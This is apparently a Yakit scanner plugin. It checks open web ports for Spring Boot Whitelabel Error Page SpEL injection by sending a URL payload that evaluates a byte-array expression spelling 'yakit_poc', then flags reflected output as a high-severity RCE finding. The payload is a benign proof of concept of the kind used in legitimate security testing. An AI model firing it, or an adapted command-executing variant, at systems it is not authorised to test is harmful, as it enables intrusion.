# port scan plugin
yakit.AutoInitYakit()

handleCheck = func(target,port, payload){
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    packet = `
GET {{params(payload)}} HTTP/1.1
Host: {{params(target)}}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0

`
    println(payload)
    rsp,req,_ = poc.HTTP(packet, 
    poc.params({"target":addr,"payload":payload}),
    poc.https(isTls),
    poc.redirectTimes(0),
    )
    // dump(rsp)
    if len(rsp) > 0 {
        println(string(rsp))
        if str.MatchAllOfSubString(rsp, `yakit_poc`) && str.MatchAllOfSubString(rsp, `Whitelabel Error Page`){
            yakit.Info("%v found Spring Whitelabel Error Page SpEL表达式注入漏洞", addr)
            risk.NewRisk(
            addr,risk.title("Spring Whitelabel Error Page SpEL表达式注入漏洞"),
            risk.severity("high"),
            risk.titleVerbose("Spring Whitelabel Error Page SpEL表达式注入漏洞存在"),
            risk.type("RCE[Spring Boot]"),
            risk.payload(`/article?id=${new%20java.lang.String(new%20byte[]{0x79,0x61,0x6b,0x69,0x74,0x5f,0x70,0x6f,0x63})}`),
            risk.request(string(req)),
            risk.response(string(rsp)),
        )
        }else{
            println("不存在Spring Whitelabel Error Page SpEL表达式注入漏洞")
            }
       
    }

    return
}
handle = func(result /* *fp.MatchResult */) {
    // handle match result
    if !result.IsOpen(){
        return
    }
    payload = `/article?id=${new%20java.lang.String(new%20byte[]{0x79,0x61,0x6b,0x69,0x74,0x5f,0x70,0x6f,0x63})}`

    if len(result.Fingerprint.HttpFlows)>0{
        handleCheck(result.Target,result.Port, payload)
    }
    
}